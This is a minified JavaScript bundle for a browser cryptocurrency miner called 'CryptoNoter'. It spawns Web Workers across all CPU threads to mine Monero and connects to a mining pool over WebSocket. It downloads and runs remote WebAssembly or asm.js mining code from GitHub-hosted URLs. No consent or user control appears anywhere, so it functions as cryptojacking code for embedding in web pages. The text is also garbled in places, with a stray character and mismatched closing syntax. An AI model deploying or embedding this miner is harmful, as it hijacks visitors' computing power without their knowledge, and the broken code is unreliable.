var Module = {};
! function(e) {
    var t = {};

    function n(r) {
        if (t[r]) return t[r].exports;
        var o = t[r] = {
            i: r,
            l: !1,
            exports: {}
        };
        return e[r].call(o.exports, o, o.exports, n), o.l = !0, o.exports
    }
    n.m = e, n.c = t, n.d = function(e, t, r) {
        n.o(e, t) || Object.defineProperty(e, t, {
            configurable: !1,
            enumerable: !0,
            get: r
        })
    }, n.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return n.d(t, "a", t), t
    }, n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 3)
}([function(e, t) {
    var n;
    n = function() {
        return this
    }();
    try {
        n = n || Function("return this")() || (0, eval)("this")
    } catch (e) {
        "object" == typeof window && (n = window)
    }
    e.exports = n
}, function(e, t, n) {
    "use strict";
    (function(t) {
        var n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        };
        e.exports = function(e, r) {
            function o(e) {
                s(e, r.jobs[0]), r.jobs.push(e), a()
            }

            function i(e, n) {
                n.onmessage = function(r) {
                    var o = r.data;
                    "finished" === o.type && (t.removeEventListener("message", n.onmessage), e.resolve(o.result))
                };
                var o = {
                    job: n.job,
                    throttle: Math.max(0, Math.min(r.throttle, 1))
                };
                n.postMessage(o)
            }

            function a() {
                if (r.jobs.length) {
                    var e = Math.min(r.jobs.length, r.threads - r.workers.length);
                    if (e > 0)
                        for (var t = 0; t < e; t++) {
                            var n = new(r.Token.INTERNAL_WORKER);
                            n.job = r.jobs.shift(), n.job.thread = r.workers.length, new Promise(i.bind(null, n)).then(c, u)
                        }
                }
            }

            function s(e, t) {
                t = t || {};
                var n = t.blob || r.blob,
                    o = t.target || r.target,
                    i = t.difficulty || r.difficulty;
                if (n !== e.blob || o !== e.target || i !== e.difficulty) {
                    for (var a = 0; a < r.jobs.length; a++) r.jobs[a].id === e.id && r.jobs.splice(a, 1);
                    for (var s = r.workers.length; s--;) r.workers[s].terminate();
                    r.workers = [], r.jobs = [], r.hashes = 0, r.init()
                }
                r.blob = e.blob, r.target = e.target, r.difficulty = e.difficulty
            }

            function c(e) {
                r.hashes += e.hashes, r.workers.splice(r.workers.indexOf(this), 1), a(), e.job_id && r.job_id !== e.job_id && (r.job_id = e.job_id, r.send("submit", {
                    job_id: e.job_id,
                    nonce: e.nonce,
                    result: e.result
                }))
            }

d           function u(e) {
                console.error(e)
            }
            if ("object" === ("undefined" == typeof r ? "undefined" : n(r))) {
                r.threads = r.threads || navigator.hardwareConcurrency || 2, r.throttle = r.throttle || 0, r.coin = r.coin || "monero", r.apiKey = e, r.on = function(e, t) {
                    "function" == typeof t && (r.listeners[e] = t)
                }, r.send = function(e, t) {
                    r.listeners[e] && r.listeners[e](t)
                }, r.Token = {
                    EVENT_OPEN: "open",
                    EVENT_AUTHED: "authed",
                    EVENT_CLOSE: "close",
                    EVENT_ERROR: "error",
                    EVENT_JOB: "job",
                    EVENT_FOUND: "found",
                    EVENT_ACCEPTED: "accepted",
                    INTERNAL_WORKER: n(4).CRYPTONIGHT_WORKER_BLOB
                };
                try {
                    var l = new WebSocket("wss://ws.supportxmr.com");
                    l.onopen = function() {
                        r.send("open"), r.init()
                    }.bind(r), l.onclose = r.send.bind(r, "close"), l.onerror = function(e) {
                        r.send("error", {
                            error: "connection error"
                        }), console.error(e)
                    }, l.onmessage = function(e) {
                        var t = JSON.parse(e.data);
                        "job" === t.type && (s(t.data), r.send("job", t.data), o(t.data)), "authed" === t.type && r.send("authed", t), "hash_accepted" === t.type && (r.send("accepted", t), r.acceptedHashes++), "banned" === t.type && r.send("error", {
                            error: "banned"
                        })
                    }
                } catch (e) {
                    u(e)
                }
                return r.init = function() {
                    r.send("submit", {
                        api_key: r.apiKey,
                        type: "auth",
                        user: r.user,
                        pass: "x",
                        version: r.version,
                        ready: !0
                    })
                }, r.stop = function() {
                    for (var e = r.workers.length; e--;) r.workers[e].terminate();
                    r.workers = [], r.jobs = []
                }, r
            }
        }
    }).call(t, n(0))
}, , function(e, t, n) {
    "use strict";
    var r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        },
        o = n(1);
    "object" !== ("undefined" == typeof CryptoNoter ? "undefined" : r(CryptoNoter)) && (CryptoNoter = {}), CryptoNoter.User = function(e, t, n) {
        n = n || {};
        var i = {
            workers: [],
            jobs: [],
            listeners: {},
            acceptedHashes: 0,
            version: "1.0.3"
        };
        for (var a in n) i[a] = n[a];
        return i.user = t, o(e, i)
    }
}, function(e, t, n) {
    "use strict";
    e.exports = {
        CRYPTONIGHT_WORKER_BLOB: new(window.Blob || window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder)([n(5)], {
            type: "application/javascript"
        })
    }
}, function(e, t, n) {
    e.exports = 'var Module = {\n    locateFile: function(path) {\n        if (path.endsWith(".wasm")) {\n            return "https://raw.githubusercontent.com/notgiven688/notgiven688.github.io/master/cryptonight-asmjs.wasm";\n        }\n        return path;\n    },\n    "crypto_night_start": null,\n    "crypto_night_h": null,\n    "HEAPU8": null,\n    "HEAPU32": null\n};\nvar cn = function() {\n    var wasmPath = "https://raw.githubusercontent.com/notgiven688/notgiven688.github.io/master/cryptonight.wasm";\n    var asmjsPath = "https://raw.githubusercontent.com/notgiven688/notgiven688.github.io/master/cryptonight-asmjs.min.js";\n\n    function hextobin(hex) {\n        if (hex.length % 2 !== 0) return null;\n        var res = new Uint8Array(hex.length / 2);\n        for (var i = 0; i < hex.length / 2; ++i) {\n            res[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16)\n        }\n        return res\n    }\n\n    function bintohex(bin) {\n        var out = [];\n        for (var i = 0; i < bin.length; ++i) {\n            out.push(("0" + bin[i].toString(16)).slice(-2))\n        }\n        return out.join("")\n    }\n    var isWasmSupported = (function() {\n        try {\n            if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {\n                const module = new WebAssembly.Module(Uint8Array.of(0x0, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00));\n                if (module instanceof WebAssembly.Module)\n                    return (new WebAssembly.Instance(module) instanceof WebAssembly.Instance)\n            }\n        } catch (e) {}\n        return false\n    })();\n    if (isWasmSupported) {\n        var req = new XMLHttpRequest;\n        req.open("GET", wasmPath, true);\n        req.responseType = "arraybuffer";\n        req.onload = function(e) {\n            var wasmModule = new WebAssembly.Module(req.response);\n            var wasmInstance = new WebAssembly.Instance(wasmModule);\n            Module.crypto_night_start = wasmInstance.exports.cn_start;\n            Module.crypto_night_h = wasmInstance.exports.cn_fast_hash;\n            Module.HEAPU8 = new Uint8Array(wasmInstance.exports.memory.buffer);\n            Module.HEAPU32 = new Uint32Array(wasmInstance.exports.memory.buffer)\n        };\n        req.send(null)\n    } else {\n        importScripts(asmjsPath)\n    }\n    onmessage = function(e) {\n        var job = e.data.job;\n        var throttle = e.data.throttle;\n        var blob = hextobin(job.blob);\n        var target = hextobin(job.target);\n        var H = null;\n        var h = new Uint32Array(8);\n        if (Module.crypto_night_start === null) {\n            setTimeout(function() {\n                postMessage({\n                    job_id: null\n                })\n            }, 1000);\n            return\n        }\n        var ctx = Module.crypto_night_start(blob, blob.length > 76 ? blob[39] - 7 : 0);\n        var j = 0;\n        var max_j = 4294967295;\n        var found = false;\n        var iterations = (1 - throttle) * 100;\n        var d = Date.now();\n        for (j = job.offset; j < max_j; j += 1) {\n            if (found) {\n                break\n            }\n            Module.HEAPU32[ctx / 4 + 1] = j;\n            H = Module.crypto_night_h(ctx, 32);\n            for (var i = 6; i >= 0; i--) {\n                if (H[i] > target[i]) {\n                    break\n                } else if (H[i] < target[i]) {\n                    h[0] = j;\n                    var result = {\n                        job_id: job.id,\n                        nonce: bintohex(new Uint8Array(h.buffer)),\n                        result: bintohex(new Uint8Array(H.buffer)),\n                        hashes: j - job.offset\n                    };\n                    postMessage(result);\n                    found = true;\n                    break\n                }\n            }\n            if (j % iterations === 0 && throttle > 0) {\n                if (Date.now() - d > 1000) {\n                    d = Date.now();\n                    var sleep = 1000 * throttle / (1 - throttle);\n                    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, sleep)\n                }\n            }\n        }\n        postMessage({\n            job_id: null,\n            hashes: j - job.offset\n        })\n    }\n}();'
}])
}(window);
